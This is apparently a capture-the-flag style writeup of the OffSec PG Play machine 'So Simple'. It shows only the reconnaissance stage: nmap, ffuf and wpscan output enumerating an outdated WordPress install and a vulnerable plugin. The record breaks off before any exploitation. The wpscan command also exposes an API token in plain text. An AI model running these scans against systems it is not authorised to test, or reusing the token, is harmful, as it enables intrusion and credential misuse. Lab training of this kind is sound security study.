---
title: "So Simple"
kind: writeup
tags:
  - offsec-pg-play
  - status/done
  - writeup
  - linux
  - web
status: "Done"
difficulty: "Intermediate"
date: 2026-08-19
category:
  - "Linux"
  - "Web"
database: "Offsec PG Play"
area: "Offsec PG Play"
up: "[[Offsec PG Play]]"
notion-id: 3c1759b9275180a3b1c3e17160b19c62
---

# So Simple

In: [[Career]] / [[Offsec PG Play]]

## Nmap Scan

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p- --min-rate=1000 -oA nmap/soSimple 192.168.158.78     
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-19 05:40 -0400
Nmap scan report for 192.168.158.78
Host is up (0.069s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b:55:43:ef:af:d0:3d:0e:63:20:7a:f4:ac:41:6a:45 (RSA)
|   256 53:f5:23:1b:e9:aa:8f:41:e2:18:c6:05:50:07:d8:d4 (ECDSA)
|_  256 55:b7:7b:7e:0b:f5:4d:1b:df:c3:5d:a1:d7:68:a9:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: So Simple
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.33 seconds

```

## Fuzzing Directories

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.158.78/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.158.78/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3761ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4767ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 70ms]
wordpress               [Status: 200, Size: 13420, Words: 520, Lines: 148, Duration: 525ms]
:: Progress: [20481/20481] :: Job [1/1] :: 566 req/sec :: Duration: [0:00:38] :: Errors: 0 ::

```

## WpSCAN

```bash
┌──(kali㉿kali)-[~]
└─$ sudo wpscan --url http://192.168.158.78/wordpress/ --enumerate --api-token sNBJsnc2OeTuZlSHM3HalpRF7Da9Wq0GBYDC9RPqosQ
[sudo] password for kali: 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                  WordPress Security Scanner
                         Version 4.1.0
                    An Automattic endeavor
                    https://automattic.com
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.158.78/wordpress/ [192.168.158.78]
[+] Started: Wed Aug 19 05:42:39 2026
[+] Command Line: wpscan --url http://192.168.158.78/wordpress/ --enumerate --api-token [REDACTED]
[+] Hostname: kali

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.158.78/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.158.78/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.158.78/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.158.78/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.158.78/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 | Confirmed By: Rss Generator (Passive Detection)
 |  - http://192.168.158.78/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |
 | [!] 50 vulnerabilities identified:
 |
 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
 |     UUID: 6a3ec618-c79e-4b9c-9020-86b157458ac5
 |     Fixed in: 5.4.5
 |     References:
 |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq
 |      - https://core.trac.wordpress.org/changeset/50717/
 |      - https://www.youtube.com/watch?v=J2GXmxAdNWs
 |
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 |     UUID: 4cd46653-4470-40ff-8aac-318bee2f998d
 |     Fixed in: 5.4.6
 |     References:
 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM
 |
 | [!] Title: WordPress 5.4 to 5.8 - Data Exposure via REST API
 |     UUID: 38dd7e87-9a22-48e2-bab1-dc79448ecdfb
 |     Fixed in: 5.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/38dd7e87-9a22-48e2-bab1-dc79448ecdfb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39200
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ca4765c62c65acb732b574a6761bf5fd84595706
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-m9hc-7v5q-x8q5
 |
 | [!] Title: WordPress 5.4 to 5.8 - Authenticated XSS in Block Editor
 |     UUID: 5b754676-20f5-4478-8fd3-6bc383145811
 |     Fixed in: 5.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/5b754676-20f5-4478-8fd3-6bc383145811
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39201
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-wh69-25hr-h94v
 |
 | [!] Title: WordPress 5.4 to 5.8 -  Lodash Library Update
 |     UUID: 5d6789db-e320-494b-81bb-e678674f4199
 |     Fixed in: 5.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/5d6789db-e320-494b-81bb-e678674f4199
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/lodash/lodash/wiki/Changelog
 |      - https://github.com/WordPress/wordpress-develop/commit/fb7ecd92acef6c813c1fde6d9d24a21e02340689
 |
 | [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
 |     UUID: cc23344a-5c91-414a-91e3-c46db614da8d
 |     Fixed in: 5.4.8
 |     References:
 |      - https://wpscan.com/vulnerability/cc23344a-5c91-414a-91e3-c46db614da8d
 |      - https://wordpress.org/news/2021/11/wordpress-5-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/ticket/54207
 |
 | [!] Title: WordPress < 5.8 - Plugin Confusion
 |     UUID: 95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
 |     Fixed in: 5.8
 |     References:
 |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223
 |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/
 |
 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
 |     UUID: 7f768bcf-ed33-4b22-b432-d1e7f95c1317
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
 |      - https://hackerone.com/reports/1378209
 |
 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
 |     UUID: dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w
 |      - https://hackerone.com/reports/425342
 |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability
 |
 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
 |     UUID: 24462ac4-7959-4575-97aa-a6dcceeae722
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86
 |
 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
 |     UUID: 008c21ab-3d7e-4d97-b6c3-db9d83f390a7
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
 |      - https://hackerone.com/reports/541469
 |
 | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
 |     UUID: 1ac912c1-5e29-41ac-8f76-a062de254c09
 |     Fixed in: 5.4.10
 |     References:
 |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
 |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Reflected Cross-Site Scripting
 |     UUID: 622893b0-c2c4-4ee7-9fa1-4cecef6e36be
 |     Fixed in: 5.4.11
 |     References:
 |      - https://wpscan.com/vulnerability/622893b0-c2c4-4ee7-9fa1-4cecef6e36be
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Authenticated Stored Cross-Site Scripting
 |     UUID: 3b1573d4-06b4-442b-bad5-872753118ee0
 |     Fixed in: 5.4.11
 |     References:
 |      - https://wpscan.com/vulnerability/3b1573d4-06b4-442b-bad5-872753118ee0
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - SQLi via Link API
 |     UUID: 601b0bf9-fed2-4675-aec7-fed3156a022f
 |     Fixed in: 5.4.11
 |     References:
 |      - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec7-fed3156a022f
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php
 |     UUID: 713bdc8b-ab7c-46d7-9847-305344a579c4
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/abf236fdaf94455e7bc6e30980cf70401003e283
 |
 | [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays
 |     UUID: 926cd097-b36f-4d26-9c51-0dfab11c301b
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/506eee125953deb658307bb3005417cb83f32095
 |
 | [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
 |     UUID: c5675b59-4b1d-4f64-9876-068e05145431
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44
 |
 | [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
 |     UUID: cfd8b50d-16aa-4319-9c2d-b227365c2156
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/8836d4682264e8030067e07f2f953a0f66cb76cc
 |
 | [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php
 |     UUID: b60a6557-ae78-465c-95bc-a78cf74a6dd0
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/a4f9ca17fae0b7d97ff807a3c234cf219810fae0
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via the Customizer
 |     UUID: 2787684c-aaef-4171-95b4-ee5048c74218
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/2ca28e49fc489a9bb3c9c9c0d8907a033fe056ef
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing
 |     UUID: 02d76d8e-9558-41a5-bdb6-3957dc31563b
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/89c8f7919460c31c0f259453b4ffb63fde9fa955
 |
 | [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked
 |     UUID: 3f707e05-25f0-4566-88ed-d8d0aff3a872
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/3765886b4903b319764490d4ad5905bc5c310ef8
 |
 | [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
 |     UUID: 1da03338-557f-4cb6-9a65-3379df4cce47
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget
 |     UUID: 58d131f5-f376-4679-b604-2b888de71c5b
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/929cf3cb9580636f1ae3fe944b8faf8cca420492
 |
 | [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint
 |     UUID: b27a8711-a0c0-4996-bd6a-01734702913e
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ebaac57a9ac0174485c65de3d32ea56de2330d8e
 |
 | [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg
 |     UUID: f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/gutenberg/pull/45045/files
 |
 | [!] Title: WP <= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding
 |     UUID: c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/
 |
 | [!] Title: WP < 6.2.1 - Directory Traversal via Translation Files
 |     UUID: 2999613a-b8c8-4ec0-9164-5dfe63adf6e6
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/2999613a-b8c8-4ec0-9164-5dfe63adf6e6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2745
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Thumbnail Image Update via CSRF
 |     UUID: a03d744a-9839-4167-a356-3e7da0f1d532
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/a03d744a-9839-4167-a356-3e7da0f1d532
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Stored XSS via Open Embed Auto Discovery
 |     UUID: 3b574451-2852-4789-bc19-d5cc39948db5
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/3b574451-2852-4789-bc19-d5cc39948db5
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.2 - Shortcode Execution in User Generated Data
 |     UUID: ef289d46-ea83-4fa5-b003-0352c690fd89
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/ef289d46-ea83-4fa5-b003-0352c690fd89
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-2-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Content Injection
 |     UUID: 1527ebdb-18bc-4f9d-9c20-8d729a628670
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/1527ebdb-18bc-4f9d-9c20-8d729a628670
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.3.2 - Denial of Service via Cache Poisoning
 |     UUID: 6d80e09d-34d5-4fda-81cb-e703d0e56e4f
 |     Fixed in: 5.4.14
 |     References:
 |      - https://wpscan.com/vulnerability/6d80e09d-34d5-4fda-81cb-e703d0e56e4f
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Subscriber+ Arbitrary Shortcode Execution
 |     UUID: 3615aea0-90aa-4f9a-9792-078a90af7f59
 |     Fixed in: 5.4.14
 |     References:
 |      - https://wpscan.com/vulnerability/3615aea0-90aa-4f9a-9792-078a90af7f59
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Contributor+ Comment Disclosure
 |     UUID: d35b2a3d-9b41-4b4f-8e87-1b8ccb370b9f
 |     Fixed in: 5.4.14
 |     References:
 |      - https://wpscan.com/vulnerability/d35b2a3d-9b41-4b4f-8e87-1b8ccb370b9f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39999
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Unauthenticated Post Author Email Disclosure
 |     UUID: 19380917-4c27-4095-abf1-eba6f913b441
 |     Fixed in: 5.4.14
 |     References:
 |      - https://wpscan.com/vulnerability/19380917-4c27-4095-abf1-eba6f913b441
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5561
 |      - https://wpscan.com/blog/email-leak-oracle-vulnerability-addressed-in-wordpress-6-3-2/
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Deserialization of Untrusted Data
 |     UUID: 5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |     Fixed in: 5.4.15
 |     References:
 |      - https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Admin+ PHP File Upload
 |     UUID: a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |     Fixed in: 5.4.15
 |     References:
 |      - https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     UUID: 2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |     Fixed in: 5.4.16
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     UUID: 7c448f6d-4531-4757-bff0-be9e3220bbbb
 |     Fixed in: 5.4.16
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     UUID: 36232787-754a-4234-83d6-6ded5e80251c
 |     Fixed in: 5.4.16
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     UUID: c4616b57-770f-4c40-93f8-29571c80330a
 |     Fixed in: 5.4.18
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     UUID: 1e2dad30-dd95-4142-903b-4d5c580eaad2
 |     Fixed in: 5.4.18
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 7.0.3 - Subscriber+ Email Change Confirmation Bypass
 |     UUID: 5ca38157-6fae-4271-a242-2a8584505d1e
 |     Fixed in: 5.4.20
 |     References:
 |      - https://wpscan.com/vulnerability/5ca38157-6fae-4271-a242-2a8584505d1e
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Unauthenticated Blind SSRF
 |     UUID: e1b9918e-1db9-4d95-be44-3241e52946eb
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/e1b9918e-1db9-4d95-be44-3241e52946eb
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Contributor+ Stored XSS in Quick Edits
 |     UUID: 72b68d3f-77a0-47dd-9624-e3631409a352
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/72b68d3f-77a0-47dd-9624-e3631409a352
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Subscriber+ Arbitrary Site Creation on Multisite
 |     UUID: b9b44801-3260-4f5a-a4cb-74f2de87e0d1
 |     Fixed in: 5.4.20
 |     References:
 |      - https://wpscan.com/vulnerability/b9b44801-3260-4f5a-a4cb-74f2de87e0d1
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Reflected XSS
 |     UUID: 4594236f-c7ad-41d6-945b-170eaabe2b75
 |     Fixed in: 5.4.20
 |     References:
 |      - https://wpscan.com/vulnerability/4594236f-c7ad-41d6-945b-170eaabe2b75
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.4 - Author+ RCE via PDF Upload
 |     UUID: 5061a614-ee26-422a-b4e8-ec88b96bb3cd
 |     Fixed in: 5.4.21
 |     References:
 |      - https://wpscan.com/vulnerability/5061a614-ee26-422a-b4e8-ec88b96bb3cd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-65640
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-4-release/

[+] WordPress theme in use: twentynineteen
 | Location: http://192.168.158.78/wordpress/wp-content/themes/twentynineteen/
 | Last Updated: 2026-05-20 4:00am GMT (3 months ago, per WordPress.org)
 | Active Installs: 90,000 (per WordPress.org)
 | Readme: http://192.168.158.78/wordpress/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 3.3
 | Style URL: http://192.168.158.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.158.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6, Match: 'Version: 1.6'

[+] Enumerating Vulnerable Plugins (via Passive and Aggressive Methods)

[+] simple-cart-solution
 | Location: http://192.168.158.78/wordpress/wp-content/plugins/simple-cart-solution/
 | Last Updated: 2022-04-17 8:50pm GMT (4 years ago, per WordPress.org)
 | Active Installs: 10 (per WordPress.org)
 | Readme: http://192.168.158.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt
 | [!] The version is out of date, the latest version is 1.0.2
 | [!] Directory listing is enabled
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Unauthorised AJAX Calls via Freemius
 |     UUID: b7d9c54a-9a9a-48ad-bb78-e30340963236
 |     Fixed in: 1.0.2
 |     Reference: https://wpscan.com/vulnerability/b7d9c54a-9a9a-48ad-bb78-e30340963236
 |
 | [!] Title: Freemius SDK < 2.5.10 - Reflected Cross-Site Scripting
 |     UUID: 35d2f1e7-a4f8-49fd-a8dd-bb2c26710f93
 |     References:
